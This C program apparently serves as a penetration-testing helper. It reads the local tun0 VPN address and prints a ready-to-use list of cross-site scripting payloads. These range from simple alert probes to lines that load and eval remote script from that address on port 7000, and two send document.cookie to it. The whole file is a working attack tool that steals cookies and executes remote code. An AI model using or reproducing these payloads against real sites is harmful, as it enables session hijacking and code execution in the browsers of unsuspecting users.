#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char tun0[64] = {0};  // Buffer for the IP
    FILE *pipe = popen("ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1", "r");

    if (!pipe) {
        perror("popen failed");
        return 1;
    }

    if (fgets(tun0, sizeof(tun0), pipe)) { tun0[strcspn(tun0, "\n")] = '\0'; }
    else { printf("tun0 interface not found or no IP assigned.\n"); }

    pclose(pipe);

    printf("\x1b[1;38;5;15m[XSS Payloads]\x1b[1;38;5;231m\n\n");
    printf("<script>alert(1)</script>\n");
    printf("\"><script>alert(1)</script>\n");
    printf("#\"><img src=/ onerror=alert(1)>\n\n");
    
    printf("<audio src onloadstart=alert(1)>");
    printf("<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">\n");
    printf("<keygen autofocus onfocus=alert(1)>\n\n");
    
    printf("'><script src=http://\x1b[1;31m%s:7000\x1b[1;38;5;231m></script>\n", tun0);
    printf("\"><script src=http://\x1b[1;31m%s:7000\x1b[1;38;5;231m></script>\n\n", tun0);
    
    printf("<script>$.getScript(\"http://\x1b[1;31m%s:7000\x1b[1;38;5;231m\")</script>\n", tun0);
    printf("<script>var i=new Image();i.src=\"http://\x1b[1;31m%s:7000\x1b[1;38;5;231m/?c=\"+document.cookie</script>\n", tun0);
    printf("<img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='http://\x1b[1;31m%s:7000\x1b[1;38;5;231m/?c'+document.cookie>\n\n", tun0);
    
    printf("<svg/onload='fetch(\"//\x1b[1;31m%s:7000/\x1b[1;38;5;231m\").then(r=>r.text().then(t=>eval(t)))'>\n", tun0);
    printf("javascript:eval('var a=document.createElement(\'script\');a.src=\'http://\x1b[1;31m%s:7000\x1b[1;38;5;231m\';document.body.appendChild(a)')\n", tun0);
    printf("<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//\x1b[1;31m%s:7000\x1b[1;38;5;231m\");a.send();</script>\n", tun0);

    return 0;
}
